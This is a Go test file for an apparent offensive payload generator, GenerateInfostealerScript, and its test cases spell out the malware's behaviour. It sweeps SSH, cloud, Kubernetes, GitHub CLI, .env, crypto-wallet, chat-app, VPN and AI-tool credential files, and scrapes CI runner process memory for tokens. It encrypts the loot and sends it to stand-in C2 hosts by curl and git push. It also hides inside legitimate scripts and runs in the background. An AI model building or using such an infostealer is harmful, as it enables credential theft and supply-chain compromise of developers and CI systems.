package payloads

import (
	"strings"
	"testing"
)

func TestGenerateInfostealerScript(t *testing.T) {
	tests := []struct {
		name     string
		opts     InfostealerOptions
		contains []string // substrings that must appear
		absent   []string // substrings that must NOT appear
	}{
		{
			name: "default with C2 URL",
			opts: InfostealerOptions{
				C2URL: "https://evil.example.com/exfil",
			},
			contains: []string{
				"#!/bin/sh",
				"_gzx",
				"printenv | sort",
				"$HOME/.ssh",
				"$HOME/.aws",
				"$HOME/.kube",
				"ip addr",
				"tar czf",
				"curl -sS",
				"https://evil.example.com/exfil",
				"bundle.tgz",
				"_gzx &",
			},
			absent: []string{
				"openssl enc",
				"git clone",
				"ORIGINAL SCRIPT CONTENT",
			},
		},
		{
			name: "empty C2 uses placeholder",
			opts: InfostealerOptions{},
			contains: []string{
				"https://example.invalid/callback",
			},
		},
		{
			name: "with encryption",
			opts: InfostealerOptions{
				C2URL:         "https://c2.example.com",
				EncryptionKey: "s3cretK3y",
			},
			contains: []string{
				"openssl enc -aes-256-cbc -pbkdf2",
				"pass:s3cretK3y",
				"bundle.enc",
			},
		},
		{
			name: "with backup exfil",
			opts: InfostealerOptions{
				C2URL:           "https://c2.example.com",
				BackupExfilRepo: "https://gitlab.com/attacker/exfil-repo.git",
			},
			contains: []string{
				"git clone",
				"https://gitlab.com/attacker/exfil-repo.git",
				"git push",
				"Backup exfil via git",
			},
		},
		{
			name: "with original content",
			opts: InfostealerOptions{
				C2URL:           "https://c2.example.com",
				OriginalContent: "#!/bin/sh\necho \"running original\"\nexit 0",
			},
			contains: []string{
				"ORIGINAL SCRIPT CONTENT",
				"echo \"running original\"",
				"exit 0",
			},
			absent: []string{
				// Shebang from original should be stripped (only one shebang)
				"#!/bin/sh\n#!/bin/sh",
			},
		},
		{
			name: "original content without shebang",
			opts: InfostealerOptions{
				C2URL:           "https://c2.example.com",
				OriginalContent: "echo hello world",
			},
			contains: []string{
				"ORIGINAL SCRIPT CONTENT",
				"echo hello world",
			},
		},
		{
			name: "custom credential paths",
			opts: InfostealerOptions{
				C2URL:           "https://c2.example.com",
				CredentialPaths: []string{"/opt/secrets", "/var/run/tokens"},
			},
			contains: []string{
				"/opt/secrets",
				"/var/run/tokens",
				"$HOME/.ssh", // defaults still present
			},
		},
		{
			name: "encryption plus backup",
			opts: InfostealerOptions{
				C2URL:           "https://c2.example.com",
				EncryptionKey:   "mykey",
				BackupExfilRepo: "https://attacker.com/repo.git",
			},
			contains: []string{
				"openssl enc",
				"bundle.enc",
				"git clone",
			},
		},
		{
			name: "proc environ scanning",
			opts: InfostealerOptions{
				C2URL:    "https://c2.example.com",
				ProcScan: true,
			},
			contains: []string{
				"/proc/",
				"environ",
				"proc_environ_all.txt",
			},
		},
		{
			name: "runner memory extraction",
			opts: InfostealerOptions{
				C2URL:      "https://c2.example.com",
				MemoryDump: true,
			},
			contains: []string{
				"Runner.Worker",
				"/proc/${_wp}/mem",
				"runner_secrets",
				"glpat-",
				"strings -n 8",
			},
		},
		{
			name: "RSA hybrid encryption overrides passphrase",
			opts: InfostealerOptions{
				C2URL:         "https://c2.example.com",
				RSAPubKey:     "-----BEGIN PUBLIC KEY-----\nMIIBIjAN...\n-----END PUBLIC KEY-----",
				EncryptionKey: "this-should-be-ignored",
			},
			contains: []string{
				"Hybrid encryption",
				"RSA-OAEP",
				"openssl pkeyutl -encrypt",
				"bundle.final",
				"openssl rand -hex 32",
			},
			absent: []string{
				"pass:this-should-be-ignored",
			},
		},
		{
			name: "extended credential sweep",
			opts: InfostealerOptions{
				C2URL:    "https://c2.example.com",
				Extended: true,
			},
			contains: []string{
				"$HOME/.ssh",                      // default still present
				"$HOME/.config/solana/id.json",    // crypto wallet
				"$HOME/.bitcoin/wallet.dat",       // bitcoin
				"$HOME/.ethereum/keystore",        // ethereum
				"$HOME/.bash_history",             // shell history
				"$HOME/.azure",                    // azure creds
				"$HOME/.config/gh/hosts.yml",      // github CLI
				"$HOME/.gradle/gradle.properties", // java build
				"/etc/ssl/private",                // system SSL keys
			},
		},
		{
			name: "all advanced features combined",
			opts: InfostealerOptions{
				C2URL:           "https://c2.example.com",
				RSAPubKey:       "-----BEGIN PUBLIC KEY-----\ntest\n-----END PUBLIC KEY-----",
				ProcScan:        true,
				MemoryDump:      true,
				Extended:        true,
				BackupExfilRepo: "https://backup.example.com/repo.git",
				OriginalContent: "#!/bin/sh\necho original",
			},
			contains: []string{
				"/proc/",
				"Runner.Worker",
				"Hybrid encryption",
				"solana",
				"git clone",
				"ORIGINAL SCRIPT CONTENT",
			},
		},
		{
			name: "extended paths include AI tool and chat/IM configs",
			opts: InfostealerOptions{
				C2URL:    "https://c2.example.com",
				Extended: true,
			},
			contains: []string{
				// AI tool configs
				"$HOME/.claude.json",
				"$HOME/.claude/mcp.json",
				"$HOME/.kiro/settings/mcp.json",
				// Chat/IM credentials
				"$HOME/.config/discord/Local Storage/leveldb",
				"$HOME/.config/Slack/Cookies",
				"$HOME/.config/Signal",
				"$HOME/.config/telegram-desktop",
				// K8s service account token
				"/var/run/secrets/kubernetes.io/serviceaccount/token",
				// Docker containers
				"/var/lib/docker/containers",
				// VPN configs
				"$HOME/.config/openvpn",
				"/etc/openvpn",
				"/etc/NetworkManager/system-connections",
				// Additional crypto wallets
				"$HOME/.cardano",
				"$HOME/.monero/wallet.keys",
				"$HOME/.zcash/wallet.dat",
				"$HOME/.polkadot",
			},
		},
		{
			name: "gh auth token extraction",
			opts: InfostealerOptions{
				C2URL: "https://c2.example.com",
			},
			contains: []string{
				"gh auth token",
				"GH_AUTH_TOKEN",
				"gh_cli_token.txt",
			},
		},
		{
			name: "env file sweep via find",
			opts: InfostealerOptions{
				C2URL: "https://c2.example.com",
			},
			contains: []string{
				"find /",
				".env",
				".env.local",
				".env.production",
				".env.staging",
				"node_modules",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := GenerateInfostealerScript(tt.opts)

			for _, s := range tt.contains {
				if !strings.Contains(got, s) {
					t.Errorf("expected output to contain %q, got:\n%s", s, got)
				}
			}

			for _, s := range tt.absent {
				if strings.Contains(got, s) {
					t.Errorf("expected output NOT to contain %q, got:\n%s", s, got)
				}
			}

			// Script must always start with shebang
			if !strings.HasPrefix(got, "#!/bin/sh") {
				t.Errorf("script must start with #!/bin/sh, got: %s", got[:40])
			}

			// Script must always background the exfil function
			if !strings.Contains(got, "_gzx &") {
				t.Error("script must background _gzx with '&'")
			}
		})
	}
}

func TestGenerateInfostealerScript_SingleShebang(t *testing.T) {
	got := GenerateInfostealerScript(InfostealerOptions{
		C2URL:           "https://c2.example.com",
		OriginalContent: "#!/bin/bash\necho original",
	})
	count := strings.Count(got, "#!")
	if count != 1 {
		t.Errorf("expected exactly 1 shebang line, got %d", count)
	}
}
